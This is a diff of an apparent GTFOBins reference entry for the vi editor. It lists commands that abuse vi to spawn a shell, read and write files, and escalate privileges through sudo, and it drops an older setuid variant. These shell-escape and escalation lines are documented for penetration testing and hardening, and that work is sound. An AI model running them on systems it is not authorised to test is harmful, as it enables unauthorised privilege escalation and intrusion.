@@ -1,13 +1,20 @@
 ---
+description: Modern Unix systems run [`vim`](/gtfobins/vim/) binary when `vi` is called.
 functions:
-  exec-interactive:
-    - code: vi -c ':!/bin/sh'
+  shell:
+    - code: vi -c ':!/bin/sh' /dev/null
     - code: |
         vi
         :set shell=/bin/sh
         :shell
-  sudo-enabled:
-    - code: sudo vi -c ':!/bin/sh'
-  suid-enabled:
-    - code: ./vi -c ':!/bin/sh -p'
+  file-write:
+    - code: |
+        vi file_to_write
+        iDATA
+        ^[
+        w
+  file-read:
+    - code: vi file_to_read
+  sudo:
+    - code: sudo vi -c ':!/bin/sh' /dev/null
 ---
